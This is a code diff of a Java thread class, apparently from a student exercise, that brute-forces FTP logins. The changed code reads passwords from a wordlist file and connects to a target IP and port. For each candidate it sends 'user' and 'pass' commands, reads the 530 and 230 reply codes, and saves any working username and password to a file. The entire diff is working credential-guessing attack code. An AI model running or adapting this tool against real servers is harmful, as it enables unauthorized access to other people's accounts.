@@ -5,7 +5,10 @@
  */
 package creackeador;
 
+import java.io.BufferedReader;
 import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.OutputStream;
@@ -28,20 +31,20 @@ public class HebraCrackeadora extends Thread {
     String ip;
     String usuario;
     int segundos;
-    LinkedList<String> contrasenias;
+    String rutaContrasenias;
     LinkedList<String> mensajes;
     FileWriter fw;
     BufferedWriter bw;
 
-    public HebraCrackeadora(String usuario, LinkedList<String> contrasenias, String ip, int puerto , int segundos) {
+    public HebraCrackeadora(String usuario, String rutaContrasenias, String rutaPares, String ip, int puerto, int segundos) {
         this.port = puerto;
         this.ip = ip;
+        this.rutaContrasenias = rutaContrasenias;
         this.segundos = segundos;
         this.usuario = usuario;
-        this.contrasenias = contrasenias;
         mensajes = new LinkedList<>();
         try {
-            fw = new FileWriter("/home/dam2/Escritorio/raulgmPGV/Creackeador/src/creackeador/pares.txt", true);
+            fw = new FileWriter(rutaPares, true);
             bw = new BufferedWriter(fw);
         } catch (IOException ex) {
         }
@@ -51,16 +54,26 @@ public class HebraCrackeadora extends Thread {
     public void run() {
         boolean intentoAcertado = false;
         int i = 0;
-        while (i < contrasenias.size() && !intentoAcertado) {
-            try {
-                Thread.sleep(segundos);
-                this.canal = new Socket(ip, port);
-                PrintWriter salida = new PrintWriter(canal.getOutputStream());
-                hebraLectoraCrackeadora = new HebraLectoraCrackeadora(mensajes, canal);
-                hebraLectoraCrackeadora.start();
-                Thread.sleep(100);
 
-                /*while (mensajes.size() > 0) {
+        try {
+
+            File contaseniasTxt = new File(rutaContrasenias);
+            FileReader fr = new FileReader(contaseniasTxt);
+            BufferedReader br = new BufferedReader(fr);
+
+            String contrasenia = br.readLine();
+
+            while (contrasenia != null && !intentoAcertado) {
+                try {
+
+                    Thread.sleep(segundos);
+                    this.canal = new Socket(ip, port);
+                    PrintWriter salida = new PrintWriter(canal.getOutputStream());
+                    hebraLectoraCrackeadora = new HebraLectoraCrackeadora(mensajes, canal);
+                    hebraLectoraCrackeadora.start();
+                    Thread.sleep(100);
+
+                    /*while (mensajes.size() > 0) {
                     String txt = mensajes.pop();
                     if (txt.contains("230")) {
                         bw.write("Usuario: " + usuario + " Contrasenia: " + contra);
@@ -69,43 +82,46 @@ public class HebraCrackeadora extends Thread {
                     }
                     System.out.println(txt);
                 }*/
-                while (mensajes.size() > 0) {
-                    mensajes.pop();
-                }
-                //String txt = mensajes.pop();
-                if (mensajes.size() <= 0) {
-                    salida.println("user " + usuario);
-                    salida.flush();
-
-                    Thread.sleep(5);
-
-                    if (mensajes.pop().contains("331")) {
-                        salida.println("pass " + contrasenias.get(i++));
+                    while (mensajes.size() > 0) {
+                        mensajes.pop();
+                    }
+                    //String txt = mensajes.pop();
+                    if (mensajes.size() <= 0) {
+                        salida.println("user " + usuario);
                         salida.flush();
 
-                        Thread.sleep(100);
+                        Thread.sleep(5);
 
-                    }
+                        if (mensajes.pop().contains("331")) {
+                            salida.println("pass " + contrasenia);
+                            salida.flush();
 
-                    if (mensajes.size() > 0) {
+                        }
+
+                        while (mensajes.isEmpty()) {
+                            Thread.sleep(250);
+                        }
+
                         String mensaje = mensajes.pop();
                         if (mensaje.contains("530")) {
                             canal.close();
                         } else if (mensaje.contains("230")) {
                             intentoAcertado = true;
-                            bw.write("usuario: " + usuario + " contrasenia: " + contrasenias.get(i));
+                            bw.write("usuario: " + usuario + " contrasenia: " + contrasenia + "\n");
                             bw.flush();
+
                         }
                     }
-                }
-                this.canal.close();
+                    this.canal.close();
 
-            } catch (IOException ex) {
-                Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
-            } catch (InterruptedException ex) {
-                Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
+                } catch (IOException ex) {
+                    Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
+                } catch (InterruptedException ex) {
+                    Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
+                }
+                contrasenia = br.readLine();
             }
+        } catch (Exception ex) {
         }
     }
-
 }
